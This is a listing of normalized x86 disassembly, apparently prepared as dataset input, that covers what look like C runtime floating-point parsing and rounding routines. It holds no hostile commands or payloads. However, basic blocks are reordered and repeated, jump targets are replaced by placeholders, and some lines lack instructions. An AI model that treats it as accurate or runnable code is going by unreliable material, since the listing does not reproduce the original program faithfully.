mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_413ffe
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
cmp ebx 0xffffc001
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
cmp esi edx
mov [ ebp + 0x8 ] esi
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_414540
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
cmp [ ebp + 0x24 ] ebx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_40d694
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40f5bf
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40fd18
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_414bd0 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
mov [ ebp - 0x58 ] esi
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
cmp al 0x9
mov [ ebp - 0x5c ] esi
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_4158f7
mov eax [ ebp - 0x64 ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x68 ] ecx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] ecx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x7c ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov esi rw-data
sub esi 0x60
cmp eax ecx
mov [ ebp - 0x54 ] eax
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] ecx
jne r-xdata
neg eax
mov esi rw-data
mov [ ebp - 0x54 ] eax
sub esi 0x60
cmp [ ebp - 0x54 ] ecx
je r-xdata
mov [ ebp - 0x3c ] cx
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add esi 0x54
and eax 0x7
test eax eax
mov [ ebp - 0x4c ] esi
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax esi
mov ebx eax
cmp [ ebx ] 0x8000
mov [ ebp - 0x70 ] ebx
jb r-xdata
movzx edx [ ebx + 0xa ]
mov ecx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax edx
mov edi 0x7fff
xor eax ecx
and ecx edi
and edx edi
and eax 0x8000
cmp cx 0x7fff
lea edi [ edx + ecx ]
movzx edi di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
mov esi [ ebp - 0x4c ]
lea ebx [ ebp - 0x48 ]
mov [ ebp - 0x70 ] ebx
neg ax
sbb eax eax
and [ ebp - 0x38 ] 0x0
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp dx 0x7fff
jae r-xdata
cmp di 0xbffd
ja r-xdata
cmp di 0x3fbf
ja r-xdata
test cx cx
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
xor ecx ecx
cmp dx cx
jne r-xdata
inc edi
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
and [ ebp - 0x68 ] ecx
lea esi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edi
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
inc esi
inc esi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x3c ]
add ebx 0x8
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ebx
cmp [ ebx + 0x4 ] ecx
jne r-xdata
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add ecx ecx
test edx edx
mov [ ebp - 0x64 ] edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x78 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebx ] ecx
jne r-xdata
and [ ebp - 0x32 ] cx
jmp r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x24 ] 0x80000000
jne r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x78 ] 0x0
mov [ esi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x3c ] ecx
jmp r-xdata
cmp [ ebp - 0x2c ] 0x8000
ja r-xdata
mov ecx edi
neg ecx
movzx esi cx
add edi esi
test di di
jg r-xdata
mov esi [ ebp - 0x28 ]
mov ecx [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr ecx 0x1f
mov edx esi
add esi esi
or esi ecx
mov ecx [ ebp - 0x24 ]
shr edx 0x1f
add ecx ecx
or ecx edx
add edi 0xffff
test di di
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ecx
jg r-xdata
mov ecx [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx ecx [ ecx ]
and [ ebp - 0x78 ] 0x0
imul ecx edx
mov edx [ esi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
mov ebx [ ebp - 0x70 ]
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x24 ]
mov ebx [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl ecx 0x1f
shr ebx 0x1
or ebx ecx
mov ecx [ ebp - 0x2c ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x2c ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
cmp di 0x7fff
mov esi [ ebp - 0x4c ]
jae r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov cx [ ebp - 0x2a ]
mov [ ebp - 0x3c ] cx
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x3a ] ecx
mov ecx [ ebp - 0x24 ]
or edi eax
mov [ ebp - 0x36 ] ecx
mov [ ebp - 0x32 ] di
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
cmp [ ebp - 0x22 ] 0xffff
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] 0x8000
inc edi
jmp r-xdata
sub_414c00
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
test cx cx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x6c ] ecx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx 0x7fff
jne r-xdata
test esi esi
jne r-xdata
test dx dx
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx ecx ax
movsx ebx cx
mov [ ebp - 0x4c ] ecx
xor eax eax
mov ecx rw-data
neg ebx
sub ecx 0x60
cmp ebx eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x20 ] ax
mov [ ebp - 0x68 ] ecx
je r-xdata
mov eax 0x80000000
cmp esi eax
mov [ ebx ] 0x1
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
cmp cx 0x3fff
mov ebx 0x7fff
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
and [ ebx ] di
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov ecx [ ebp - 0x4c ]
mov [ edx ] cx
je r-xdata
mov esi [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
movzx edx cx
mov ecx esi
xor ecx edx
and edx ebx
and esi ebx
and ecx 0x8000
cmp dx bx
lea edi [ esi + edx ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
movzx edi di
jae r-xdata
cmp ebx eax
je r-xdata
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x68 ] ecx
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40fd18
leave
retn
push 0x15
pop ecx
cmp [ ebp + 0x14 ] ecx
jle r-xdata
movsx ecx cx
add [ ebp + 0x14 ] ecx
cmp [ ebp + 0x14 ] eax
jg r-xdata
neg cx
sbb ecx ecx
and ecx 0x80000000
